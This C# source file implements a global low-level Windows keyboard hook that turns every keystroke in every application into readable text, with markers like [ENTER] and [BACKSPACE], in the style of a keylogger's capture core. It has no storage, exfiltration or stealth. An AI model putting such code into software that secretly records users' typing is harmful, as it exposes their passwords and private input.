using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public event EventHandler<KeyPressedEventArgs> KeyPressed;

    private IntPtr _hookID = IntPtr.Zero;
    private LowLevelKeyboardProc _proc;
    private readonly HashSet<Keys> _pressedKeys = new HashSet<Keys>();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public KeyboardHook()
    {
        _proc = HookCallback;
    }

    public void HookStart()
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public void HookStop()
    {
        UnhookWindowsHookEx(_hookID);
        _pressedKeys.Clear();
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;

            if (wParam == (IntPtr)WM_KEYDOWN)
            {
                if (!_pressedKeys.Contains(key))
                {
                    _pressedKeys.Add(key);

                    string keyString = ProcessKey(key);
                    if (!string.IsNullOrEmpty(keyString))
                    {
                        KeyPressed?.Invoke(this, new KeyPressedEventArgs(keyString));
                    }
                }
            }
            else if (wParam == (IntPtr)WM_KEYUP)
            {
                _pressedKeys.Remove(key);
            }
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private string ProcessKey(Keys key)
    {
        if (key == Keys.LControlKey || key == Keys.RControlKey ||
            key == Keys.LMenu || key == Keys.RMenu ||
            key == Keys.LShiftKey || key == Keys.RShiftKey ||
            key == Keys.Capital || key == Keys.NumLock ||
            key == Keys.Scroll)
        {
            return string.Empty;
        }

        bool capsLock = Control.IsKeyLocked(Keys.CapsLock);
        bool shiftPressed = (_pressedKeys.Contains(Keys.LShiftKey) || _pressedKeys.Contains(Keys.RShiftKey));
        bool isUpper = capsLock ^ shiftPressed;

        switch (key)
        {
            case Keys.Enter: return "[ENTER]\n";
            case Keys.Space: return " ";
            case Keys.Back: return "[BACKSPACE]";
            case Keys.Tab: return "[TAB]";
            case Keys.Escape: return "[ESC]";
            case Keys.Delete: return "[DELETE]";
            case Keys.Insert: return "[INSERT]";
            case Keys.Home: return "[HOME]";
            case Keys.End: return "[END]";
            case Keys.PageUp: return "[PAGEUP]";
            case Keys.PageDown: return "[PAGEDOWN]";
            case Keys.Left: return "[LEFT]";
            case Keys.Right: return "[RIGHT]";
            case Keys.Up: return "[UP]";
            case Keys.Down: return "[DOWN]";
            case Keys.NumPad0: return "0";
            case Keys.NumPad1: return "1";
            case Keys.NumPad2: return "2";
            case Keys.NumPad3: return "3";
            case Keys.NumPad4: return "4";
            case Keys.NumPad5: return "5";
            case Keys.NumPad6: return "6";
            case Keys.NumPad7: return "7";
            case Keys.NumPad8: return "8";
            case Keys.NumPad9: return "9";
            case Keys.Multiply: return "*";
            case Keys.Add: return "+";
            case Keys.Subtract: return "-";
            case Keys.Decimal: return ".";
            case Keys.Divide: return "/";
        }

        if (key >= Keys.A && key <= Keys.Z)
        {
            char character = (char)('a' + (key - Keys.A));
            return isUpper ? character.ToString().ToUpper() : character.ToString();
        }
        else if (key >= Keys.D0 && key <= Keys.D9)
        {
            if (shiftPressed)
            {
                switch (key)
                {
                    case Keys.D0: return ")";
                    case Keys.D1: return "!";
                    case Keys.D2: return "@";
                    case Keys.D3: return "#";
                    case Keys.D4: return "$";
                    case Keys.D5: return "%";
                    case Keys.D6: return "^";
                    case Keys.D7: return "&";
                    case Keys.D8: return "*";
                    case Keys.D9: return "(";
                }
            }
            return ((char)('0' + (key - Keys.D0))).ToString();
        }

        switch (key)
        {
            case Keys.Oemcomma: return shiftPressed ? "<" : ",";
            case Keys.OemPeriod: return shiftPressed ? ">" : ".";
            case Keys.OemQuestion: return shiftPressed ? "?" : "/";
            case Keys.OemSemicolon: return shiftPressed ? ":" : ";";
            case Keys.OemQuotes: return shiftPressed ? "\"" : "'";
            case Keys.OemOpenBrackets: return shiftPressed ? "{" : "[";
            case Keys.OemCloseBrackets: return shiftPressed ? "}" : "]";
            case Keys.OemPipe: return shiftPressed ? "|" : "\\";
            case Keys.OemMinus: return shiftPressed ? "_" : "-";
            case Keys.OemPlus: return shiftPressed ? "+" : "=";
            case Keys.Oemtilde: return shiftPressed ? "~" : "`";
        }

        return $"[{key}]";
    }
}

public class KeyPressedEventArgs : EventArgs
{
    public string KeyString { get; }

    public KeyPressedEventArgs(string keyString)
    {
        KeyString = keyString;
    }
}
